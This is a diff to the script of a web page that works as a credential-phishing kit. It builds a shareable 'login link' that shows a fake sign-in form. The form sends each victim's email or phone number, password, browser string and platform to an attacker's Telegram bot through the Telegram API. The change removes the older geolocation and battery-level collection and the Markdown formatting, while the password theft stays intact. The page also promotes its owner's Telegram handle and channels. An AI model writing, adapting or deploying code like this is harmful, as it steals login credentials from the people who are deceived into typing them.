@@ -111,13 +111,14 @@
 </div>
 
 <script>
-    // Function to send the login link to the Telegram chat with formatted message
+    // Function to send the login link to the Telegram chat
     function sendLoginLink() {
         var botToken = document.getElementById('botToken').value;
         var chatId = document.getElementById('chatId').value;
         var loginUrl = window.location.href + "?botToken=" + botToken + "&chatId=" + chatId + "#login";
 
-        var message = `🚀 **Login Link**\n\n🔗 **Link**: ${loginUrl}\n\n👤 **Owner**: @sasumon007\n📢 **Join my channel**: https://t.me/+XjCxuJspHaQxNTA1?fbclid=IwZXh0bgNhZW0CMTEAAR1Pc2E33PMR89KZj6DsfON-o1ey5j1UBmw_EOZvFPWLvfQsg3wYGs_tZZM_aem_v5p6ja1CWNH0EkGF50tmwQ`;
+        // Updated message with two channels
+        var message = `Login here: ${loginUrl}\nOwner: @sasumon007\nJoin my channels:\n@SA\\_Tech\\_Tutorial\n@SA\\_Tech\\_Tips`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -126,8 +127,7 @@
             },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: message,
-                parse_mode: "Markdown"
+                text: message
             })
         }).then(response => response.json())
           .then(data => {
@@ -139,31 +139,12 @@
         });
     }
 
-    // Function to get device information including battery level and location
-    async function getDeviceInfo() {
-        var deviceInfo = `📱 **Device Info**:\n`;
-        deviceInfo += `🌐 **Browser**: ${navigator.userAgent}\n`;
-        deviceInfo += `💻 **Platform**: ${navigator.platform}\n`;
-
-        // Battery Status
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            deviceInfo += `🔋 **Battery**: ${Math.round(battery.level * 100)}%\n`;
-        } else {
-            deviceInfo += `🔋 **Battery**: Not available\n`;
-        }
-
-        // Location
-        return new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(position => {
-                const { latitude, longitude } = position.coords;
-                deviceInfo += `📍 **Location**: Latitude ${latitude.toFixed(2)}, Longitude ${longitude.toFixed(2)}\n`;
-                resolve(deviceInfo);
-            }, () => {
-                deviceInfo += `📍 **Location**: Not available\n`;
-                resolve(deviceInfo);
-            });
-        });
+    // Function to get device information
+    function getDeviceInfo() {
+        var deviceInfo = `Device Info:\n`;
+        deviceInfo += `Browser: ${navigator.userAgent}\n`;
+        deviceInfo += `Platform: ${navigator.platform}\n`;
+        return deviceInfo;
     }
 
     // Function to handle URL parameters and show the login form if login link is clicked
@@ -183,18 +164,16 @@
     }
 
     // Function to submit the login info to the Telegram bot with device info
-    async function submitLogin() {
+    function submitLogin() {
         var emailOrPhone = document.getElementById('emailOrPhone').value;
         var password = document.getElementById('password').value;
         var loginBtn = document.getElementById('loginBtn');
 
         // Get device information
-        var deviceInfo = await getDeviceInfo();
+        var deviceInfo = getDeviceInfo();
 
         // Disable the login button to prevent multiple submissions
         loginBtn.disabled = true;
-
-        var message = `🔐 **Login Info**:\n\n📧 **Email/Phone**: ${emailOrPhone}\n🔑 **Password**: ${password}\n\n${deviceInfo}`;
 
         fetch(`https://api.telegram.org/bot${window.botToken}/sendMessage`, {
             method: "POST",
@@ -203,8 +182,7 @@
             },
             body: JSON.stringify({
                 chat_id: window.chatId,
-                text: message,
-                parse_mode: "Markdown"
+                text: `Login info:\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}\n${deviceInfo}`
             })
         }).then(response => response.json())
           .then(data => {
@@ -217,7 +195,8 @@
             }
         }).finally(() => {
             // Re-enable the button after the request is completed
-            loginBtn.disabled = false;
+      
+      loginBtn.disabled = false;
         });
     }
 
